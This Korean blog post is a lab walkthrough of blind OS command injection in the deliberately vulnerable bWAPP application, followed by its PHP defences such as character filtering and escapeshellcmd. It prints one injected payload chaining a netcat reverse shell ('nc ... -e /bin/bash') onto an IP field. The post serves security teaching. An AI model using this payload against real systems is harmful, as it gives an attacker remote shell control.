---
title: "[bWAPP] 1. Injection - OS Command Injection(Blind)"
---

<br>

## Injection

공격자가 신뢰할 수 없는 입력을 프로그램에 주입하도록 하는 공격.

<br>

<br>

## Command Injection

OS명령어를 입력하여 내부정보 유출 및 악의적인 행위를 수행

포트를 열고 포트서버에 연결하여 원격조정을 해보자

<br>

<br>

## Blind Injection

Blind SQL Injection으로 많이 사용

SQL인젝션 공격에는 쿼리 조건을 무력화하여 인증을 우회하거나,쿼리 결과에 정보를 붙여서 데이터를 유출하거나 시스템 명령어를 삽입하는 형태로 공격이 진행

하지만, 공격하는 대상 웹페이지가 어떤 오류도 출력하지 않고 쿼리 겨로가 리스트도 제공하지 않는다면 

Blind SQL Injection으로 쿼리 결과의 참/거짓을 통해 DB 값 유출해 내는 기법

자세한 건 SQL Injection에서 다뤄볼 예정

![image-20220316021508405](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220316021508405.png)

<br>

### IP 입력

![image-20220316021540409](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220316021540409.png)

- OS Command Injection과 동일하게 진행해보자

<br>

### 리눅스

![image-20220316020337128](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220316020337128.png)

- 포트 열어주고

<br>

### Bbox

![image-20220316022107295](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220316022107295.png)

`172.30.1.25 && nc -vn 172.30.1.31 8888 -e /bin/bash`

- 코드 삽입

<br>

### 결과

![image-20220316020639739](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220316020639739.png)

<br>

<br>

## 대응방안

### Linux

![image-20220317225533437](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220317225533437.png)

- vi 편집기를 통해 commandi.php 소스코드를 열어주면
- 레벨 1 = Medium 일 때 commandi_check_1 함수를 쓰고
- 레벨 2 = High 일 때 commindi_check_2 함수를 쓰는 것을 확인할 수 있다.

<br>

### functions_external.php

![image-20220317225732419](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220317225732419.png)

- commandi_check_1 에서는 "&", ";" 문자들을 공백으로 대체해주고
- commnadi_check_2 에서는 escapeshellcmd 함수를 사용하여 보안을 적용하고 있다.
- escapeshellcmd : 
  - 인자로 받은 명령어가 실행되었을 때, 의도치 않았던 쉘 명령어가 실행되는 것을 방지하는 함수.
  - 메타캐릭터에 역슬래쉬를 붙여 명령어를 실행하지 못하게 한다.